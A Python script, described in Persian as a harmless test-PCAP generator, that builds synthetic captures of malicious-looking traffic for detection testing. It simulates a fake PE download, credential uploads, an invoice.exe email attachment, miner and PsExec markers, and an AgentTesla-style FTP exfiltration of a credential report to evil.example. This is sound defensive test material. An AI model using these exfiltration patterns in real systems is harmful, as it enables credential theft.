"""ساخت PCAP آزمایشی بی‌خطر بدون scapy (فقط struct) — HTTP/DNS/TLS/FTP/SMTP/DHCP/ARP/ICMP/TFTP.
هیچ بدافزار واقعی نیست؛ «PE» فقط یک هدر ساختگی است."""
import gzip
import socket
import struct
import sys

T0 = 1_700_000_000.0


class W:
    def __init__(self):
        self.pk = []
        self.t = T0
        self.seq = {}

    def _eth(self, payload, et=0x0800):
        return b"\x02\x00\x00\x00\x00\x01" + b"\x02\x00\x00\x00\x00\x02" + struct.pack("!H", et) + payload

    def _ip(self, src, dst, proto, l4):
        h = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 20 + len(l4), 0, 0, 64, proto, 0, socket.inet_aton(src), socket.inet_aton(dst))
        return h + l4

    def add(self, frame, dt=0.01):
        self.t += dt
        self.pk.append((self.t, frame))

    def tcp(self, src, sp, dst, dp, data=b"", flags=0x18, dt=0.01):
        k = (src, sp, dst, dp)
        seq = self.seq.get(k, 1000)
        th = struct.pack("!HHIIBBHHH", sp, dp, seq, 0, 5 << 4, flags, 65535, 0, 0)
        self.seq[k] = seq + len(data) + (1 if flags & 3 else 0)
        self.add(self._eth(self._ip(src, dst, 6, th + data)), dt)

    def stream(self, src, sp, dst, dp, data, mss=1400):
        for i in range(0, len(data), mss):
            self.tcp(src, sp, dst, dp, data[i:i + mss], 0x18, 0.001)

    def udp(self, src, sp, dst, dp, data):
        uh = struct.pack("!HHHH", sp, dp, 8 + len(data), 0)
        self.add(self._eth(self._ip(src, dst, 17, uh + data)))

    def icmp(self, src, dst, typ, payload=b"\x00" * 32):
        self.add(self._eth(self._ip(src, dst, 1, struct.pack("!BBHHH", typ, 0, 0, 1, 1) + payload)))

    def arp(self, op, psrc, pdst, hs=b"\x02\x00\x00\x00\x00\x02", hd=b"\x00" * 6):
        self.add(self._eth(struct.pack("!HHBBH", 1, 0x0800, 6, 4, op) + hs + socket.inet_aton(psrc) + hd + socket.inet_aton(pdst), 0x0806))

    def save(self, path, ng=False):
        with open(path, "wb") as f:
            f.write(struct.pack("<IHHiIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535, 1))
            for t, fr in self.pk:
                f.write(struct.pack("<IIII", int(t), int((t % 1) * 1e6), len(fr), len(fr)) + fr)


def dns_q(name, tid=0x1234, qt=1):
    return struct.pack("!HHHHHH", tid, 0x0100, 1, 0, 0, 0) + b"".join(bytes([len(x)]) + x.encode() for x in name.split(".")) + b"\x00" + struct.pack("!HH", qt, 1)


def dns_r(name, ip, tid=0x1234):
    q = dns_q(name, tid)
    ans = b"\xc0\x0c" + struct.pack("!HHIH", 1, 1, 300, 4) + socket.inet_aton(ip)
    return struct.pack("!HHHHHH", tid, 0x8180, 1, 1, 0, 0) + q[12:] + ans


def http_resp(body, ctype="application/octet-stream", extra="", gz=False, chunked=False, status="200 OK"):
    if gz:
        body = gzip.compress(body)
        extra += "Content-Encoding: gzip\r\n"
    if chunked:
        parts = b"".join(b"%x\r\n" % len(body[i:i + 700]) + body[i:i + 700] + b"\r\n" for i in range(0, len(body), 700)) + b"0\r\n\r\n"
        return f"HTTP/1.1 {status}\r\nContent-Type: {ctype}\r\nTransfer-Encoding: chunked\r\n{extra}\r\n".encode() + parts
    return f"HTTP/1.1 {status}\r\nContent-Type: {ctype}\r\nContent-Length: {len(body)}\r\n{extra}\r\n".encode() + body


def fake_pe():
    h = bytearray(b"MZ" + b"\x00" * 0x7E)
    h[0x3C:0x40] = (0x80).to_bytes(4, "little")
    return bytes(h) + b"PE\x00\x00" + b"\x4c\x01" + b"\x00" * 18 + bytes(range(256)) * 12


PNG = bytes.fromhex("89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c4890000000d49444154789c6360f8cfc0f01f0005000201a5f645400000000049454e44ae426082")


def build(path):
    w = W()
    c, srv, ext, dns, ftp, mail = "10.0.0.5", "10.0.0.9", "45.33.32.156", "8.8.8.8", "10.0.0.20", "10.0.0.25"
    w.arp(1, c, srv)
    w.arp(2, srv, c)
    w.icmp(c, srv, 8)
    w.icmp(srv, c, 0)
    for i, (n, ip) in enumerate((("files.example.test", ext), ("cdn.example.test", "93.184.216.34"), ("abc.ngrok.io", "3.3.3.3"))):
        w.udp(c, 40000 + i, dns, 53, dns_q(n, 0x100 + i))
        w.udp(dns, 53, c, 40000 + i, dns_r(n, ip, 0x100 + i))
    w.udp(c, 40100, dns, 53, dns_q("nope.evil.top", 0x200))
    w.udp(dns, 53, c, 40100, struct.pack("!HHHHHH", 0x200, 0x8183, 1, 0, 0, 0) + dns_q("nope.evil.top", 0x200)[12:])
    # --- HTTP keep-alive: 4 downloads in a single connection
    cp = 50001
    w.tcp(c, cp, ext, 80, flags=0x02)
    reqs, resps = [], []
    page = b"<html><head><title>Files</title></head><body>hello</body></html>" * 20
    doc = b"%PDF-1.4\n1 0 obj<</Type/Catalog>>endobj\n" + b"A" * 3000 + b"\n%%EOF"
    for path_, body, kw in (
        ("/", page, dict(ctype="text/html", gz=True)),
        ("/dl/report-Q3.pdf", doc, dict(ctype="application/pdf", extra='Content-Disposition: attachment; filename="Quarterly Report Q3.pdf"\r\n', chunked=True)),
        ("/payload/setup.exe", fake_pe(), dict(ctype="application/octet-stream")),
        ("/img/logo.png", PNG, dict(ctype="image/png")),
        ("/get.php?id=7", fake_pe(), dict(ctype="text/html")),
    ):
        rq = f"GET {path_} HTTP/1.1\r\nHost: files.example.test\r\nUser-Agent: Mozilla/5.0 (X11)\r\nAccept: */*\r\n\r\n".encode()
        w.stream(c, cp, ext, 80, rq)
        w.stream(ext, 80, c, cp, http_resp(body, **kw))
    # upload multipart
    bnd = "----X1"
    mp = (f"--{bnd}\r\nContent-Disposition: form-data; name=\"f\"; filename=\"secrets.txt\"\r\nContent-Type: text/plain\r\n\r\n"
          "user=admin pass=hunter2\r\n--" + bnd + "--\r\n").encode()
    w.stream(c, cp, ext, 80, (f"POST /up HTTP/1.1\r\nHost: drop.example.test\r\nContent-Type: multipart/form-data; boundary={bnd}\r\n"
                              f"Content-Length: {len(mp)}\r\n\r\n").encode() + mp)
    w.stream(ext, 80, c, cp, http_resp(b"ok", "text/plain"))
    # --- TLS ClientHello (SNI)
    sni = b"secure.example.test"
    ext_sni = struct.pack("!HHHBH", 0, len(sni) + 5, len(sni) + 3, 0, len(sni)) + sni
    alpn = struct.pack("!HHH", 16, 14, 12) + b"\x02h2\x08http/1.1"
    exts = ext_sni + alpn
    ch = b"\x03\x03" + b"\x11" * 32 + b"\x00" + struct.pack("!H", 4) + b"\x13\x01\x13\x02" + b"\x01\x00" + struct.pack("!H", len(exts)) + exts
    hs = b"\x01" + len(ch).to_bytes(3, "big") + ch
    w.tcp(c, 51000, ext, 443, b"\x16\x03\x01" + struct.pack("!H", len(hs)) + hs)
    # --- FTP
    w.tcp(c, 52000, ftp, 21, flags=0x02)
    w.tcp(ftp, 21, c, 52000, b"220 FTP ready\r\n")
    w.tcp(c, 52000, ftp, 21, b"USER bob\r\n")
    w.tcp(c, 52000, ftp, 21, b"PASS s3cret\r\n")
    w.tcp(c, 52000, ftp, 21, b"PASV\r\n")
    w.tcp(ftp, 21, c, 52000, b"227 Entering Passive Mode (10,0,0,20,200,10)\r\n")
    w.tcp(c, 52000, ftp, 21, b"RETR backup.zip\r\n")
    zdata = b"PK\x03\x04" + b"\x14\x00" * 4 + b"Z" * 2000
    w.tcp(c, 52100, ftp, 51210, flags=0x02)
    w.stream(ftp, 51210, c, 52100, zdata)
    # --- SMTP with attachment
    w.tcp(c, 53000, mail, 25, flags=0x02)
    w.tcp(mail, 25, c, 53000, b"220 mail ESMTP\r\n")
    w.tcp(c, 53000, mail, 25, b"EHLO client\r\n")
    w.tcp(c, 53000, mail, 25, b"MAIL FROM:<a@x.test>\r\nRCPT TO:<b@y.test>\r\n")
    msg = (b"From: a@x.test\r\nTo: b@y.test\r\nSubject: Invoice\r\nMIME-Version: 1.0\r\nContent-Type: multipart/mixed; boundary=BB\r\n\r\n"
           b"--BB\r\nContent-Type: text/plain\r\n\r\nSee attached\r\n--BB\r\nContent-Type: application/octet-stream\r\n"
           b"Content-Transfer-Encoding: base64\r\nContent-Disposition: attachment; filename=\"invoice.exe\"\r\n\r\n"
           + __import__("base64").b64encode(fake_pe()) + b"\r\n--BB--\r\n")
    w.stream(c, 53000, mail, 25, b"DATA\r\n" + msg + b"\r\n.\r\nQUIT\r\n")
    # --- mining + SMB marker (existing detections)
    w.tcp(c, 54000, ext, 3333, b'{"id":1,"method":"mining.subscribe","params":[]}\n')
    w.tcp(c, 54001, srv, 445, b"\x00\x00\x00\x40\xffSMB....\\pipe\\svcctl PSEXESVC")
    # --- TFTP
    w.udp(c, 55000, srv, 69, b"\x00\x01config.bin\x00octet\x00")
    w.udp(srv, 40001, c, 55000, b"\x00\x03\x00\x01" + b"CFG" * 100)
    w.save(path)


if __name__ == "__main__":
    build(sys.argv[1] if len(sys.argv) > 1 else "native.pcap")


def build_stealer(path):
    """Synthetic GuLoader -> AgentTesla-style chain: cloud staging SNI, IP lookup, FTP exfil of a credential report."""
    w = W()
    v, dns, ftp, ipapi = "10.2.3.101", "10.2.3.1", "162.241.123.75", "208.95.112.1"
    w.udp(v, 40000, dns, 53, dns_q("drive.usercontent.google.com", 0x31))
    sni = b"drive.usercontent.google.com"
    ext_sni = struct.pack("!HHHBH", 0, len(sni) + 5, len(sni) + 3, 0, len(sni)) + sni
    ch = b"\x03\x03" + b"\x22" * 32 + b"\x00" + struct.pack("!H", 4) + b"\x13\x01\x13\x02" + b"\x01\x00" + struct.pack("!H", len(ext_sni)) + ext_sni
    hs = b"\x01" + len(ch).to_bytes(3, "big") + ch
    w.tcp(v, 50100, "142.250.1.1", 443, b"\x16\x03\x01" + struct.pack("!H", len(hs)) + hs)
    w.udp(v, 40001, dns, 53, dns_q("ip-api.com", 0x32))
    w.tcp(v, 50101, ipapi, 80, flags=0x02)
    w.stream(v, 50101, ipapi, 80, b"GET /line/?fields=hosting HTTP/1.1\r\nHost: ip-api.com\r\n\r\n")
    w.stream(ipapi, 80, v, 50101, http_resp(b"false", "text/plain"))
    w.tcp(v, 52000, ftp, 21, flags=0x02)
    w.tcp(ftp, 21, v, 52000, b"220 FTP ready\r\n")
    w.tcp(v, 52000, ftp, 21, b"USER stolen@evil.example\r\n")
    w.tcp(v, 52000, ftp, 21, b"PASS S3cretPass\r\n")
    w.tcp(v, 52000, ftp, 21, b"PASV\r\n")
    w.tcp(ftp, 21, v, 52000, b"227 Entering Passive Mode (162,241,123,75,200,10)\r\n")
    fn = "PW_tyler-DESKTOP-W7F98GR_2026_02_03_16_13_59.html"
    w.tcp(v, 52000, ftp, 21, f"STOR {fn}\r\n".encode())
    body = (b"<html><body><b>Time: </b>02/03/2026 16:13:59<br><b>User Name: </b>tyler<br><b>Computer Name: </b>DESKTOP-W7F98GR<br>"
            b"<b>OSFullName: </b>Microsoft Windows 11 Pro<br><hr>Host: mail.example.test<br>Username: tyler@example.test<br>Password: hunter22<br>"
            b"Application: Thunderbird<br><hr>Host: bank.example.test<br>Username: tyler<br>Password: p4ss<br>Application: Chrome<br></body></html>")
    w.tcp(v, 52100, ftp, 51210, flags=0x02)
    w.stream(v, 52100, ftp, 51210, body)
    w.save(path)
